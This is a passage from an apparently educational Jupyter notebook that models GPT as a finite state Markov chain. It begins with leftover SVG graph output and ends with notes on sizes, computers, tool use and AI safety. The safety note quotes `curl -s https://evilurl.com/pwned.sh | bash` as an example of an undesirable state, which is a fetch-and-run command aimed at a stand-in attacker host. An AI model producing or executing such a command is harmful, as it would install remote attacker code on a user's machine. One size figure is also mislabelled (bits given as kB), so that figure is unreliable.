104.33,-330.82\"/>\n<text text-anchor=\"middle\" x=\"62.81\" y=\"-304.72\" font-family=\"Times,serif\" font-size=\"14.00\">1(41%)</text>\n</g>\n<!-- 21&#45;&gt;12 -->\n<g id=\"edge24\" class=\"edge\">\n<title>21&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M52.28,-239.52C54.38,-219.22 54.66,-185.91 53.12,-162.15\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"56.59,-161.66 52.28,-151.98 49.61,-162.24 56.59,-161.66\"/>\n<text text-anchor=\"middle\" x=\"73.7\" y=\"-204.63\" font-family=\"Times,serif\" font-size=\"14.00\">2(27%)</text>\n</g>\n<!-- 22&#45;&gt;20 -->\n<g id=\"edge25\" class=\"edge\">\n<title>22&#45;&gt;20</title>\n<path fill=\"none\" stroke=\"black\" d=\"M221.9,-22.65C204.7,-25.69 182.01,-29.69 163.09,-33.02\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"162.28,-29.61 153.03,-34.8 163.49,-36.51 162.28,-29.61\"/>\n<text text-anchor=\"middle\" x=\"192.5\" y=\"-16.64\" font-family=\"Times,serif\" font-size=\"14.00\">0(30%)</text>\n</g>\n<!-- 22&#45;&gt;21 -->\n<g id=\"edge26\" class=\"edge\">\n<title>22&#45;&gt;21</title>\n<path fill=\"none\" stroke=\"black\" d=\"M235.1,-33.71C200.68,-74.73 107.97,-185.22 67.13,-233.9\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"64.33,-231.79 60.58,-241.7 69.69,-236.29 64.33,-231.79\"/>\n<text text-anchor=\"middle\" x=\"130.11\" y=\"-137.6\" font-family=\"Times,serif\" font-size=\"14.00\">1(30%)</text>\n</g>\n<!-- 22&#45;&gt;22 -->\n<g id=\"edge27\" class=\"edge\">\n<title>22&#45;&gt;22</title>\n<path fill=\"none\" stroke=\"black\" d=\"M273.73,-24.69C284.31,-25.15 293.29,-22.92 293.29,-18 293.29,-14.77 289.42,-12.7 283.77,-11.79\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"283.88,-8.29 273.73,-11.31 283.55,-15.28 283.88,-8.29\"/>\n<text text-anchor=\"middle\" x=\"314.29\" y=\"-14.3\" font-family=\"Times,serif\" font-size=\"14.00\">2(40%)</text>\n</g>\n</g>\n</svg>\n",
            "text/plain": [
              "<graphviz.graphs.Digraph at 0x7f4d6893a0a0>"
            ]
          },
          "metadata": {},
          "execution_count": 14
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Looks cool! Not sure where I was going with that though. So let's wrap up:"
      ],
      "metadata": {
        "id": "GkcjENco5NpB"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Notes\n",
        "\n",
        "**Realistic sizes:** The above was a binary GPT over 3 tokens. In practice, the vocabulary size is not 2 but e.g. more like 50,000. And we don't take 3 token sequences, but a typical context length could be ~2048 or even all the way up to ~32,000.\n",
        "\n",
        "**Computers:** Computers are similar, but more of a finite state machine instead of a finite state markov chain. They have memory that stores bits. Bits are discrete. And the CPU defines the transition table. However, computers are ~deterministic dynamical systems so the outbound arrows have probabilities all zero except for the one next state. Unlike this, GPT is a very different kind of computer architecture that is stochastic by default, and computes over tokens, not bits. That said, it is trivially possible to make a GPT into a finite state machine as well by sampling at zero temperature. That means that we always greedily pick the most likely token to come next, without flipping any biased coins. One could even be less greedy and run beam search. However, losing all that entropy during sampling has adverse effects on benchmarks and the qualitative look and feel of the samples (they look very \"safe\", boring), so this is not typically done in practice.\n",
        "\n",
        "**Size comparion:** [This good post](https://www.lesswrong.com/posts/7qSHKYRnqyrumEfbt) pointed out a size comparison between GPT computers and computer computers, e.g.:\n",
        "\n",
        "- GPT-2 has 50,257 tokens and context length of 2048 tokens. So `log2(50,257) * 2048 = 31,984 bits per state = 3,998 kB. Thats' enough to [get to the moon](https://www.digitec.ch/en/page/apollo-11-to-the-moon-with-4-kb-of-ram-12707).\n",
        "- GPT-3 has context length of 4096, so 8kB of memory; Roughly an [Atari 800](https://en.wikipedia.org/wiki/Atari_8-bit_family).\n",
        "- GPT-4 is up to 32K tokens so roughly 64kB, i.e. a [Commodore64](https://en.wikipedia.org/wiki/Commodore_64).\n",
        "\n",
        "**I/O devices:** All of the Finite State Machine analysis breaks down once you start to include Input devices that connect to the outside world. In a computer that could be a mouse or a keyboard. In GPT land this would be any kind of external tool use. E.g. Microsoft Bing is able to run retrieval queries to fetch outside information and incorporate it as an input.\n",
        "\n",
        "**AI Safety:** What is safety viewed through the lens of GPTs as a Finite State Markov Chain? It is the elimination of all probability of transitioning to naughty states. E.g. states that end with the token sequence `[66, 6371, 532, 82, 3740, 1378, 23542, 6371, 13, 785, 14, 79, 675, 276, 13, 1477, 930, 27334]`. This sequence of tokens encodes for `curl -s https://evilurl.com/pwned.sh | bash`. In a larger environment where those tokens might end up getting executed in a Terminal that would be problematic. More generally you could imagine that some portion of the state space is \"colored red\" for undesirable states that we never want to transition to. There is a very large collection of these and they are hard to explicitly enumerate, so simple ways of one-off \"blocking them\" is not satisfying. The GPT model itself must *know* based on training data and the inductive bias of the Transformer that those states should be transitioned to with effectively 0% probability. And if the probability isn't sufficiently small (e.g. < 1e-100?), then in large enough deployments (which might have temperature > 0, and might not use `topp` / `topk` sampling hyperparameters that force clamp low probability transitions to exactly zero) you could imagine stumbling into them by chance."
      ],
      "metadata": {
        "id": "xQmrWAhT6mkK"
      }
    }
  ]
}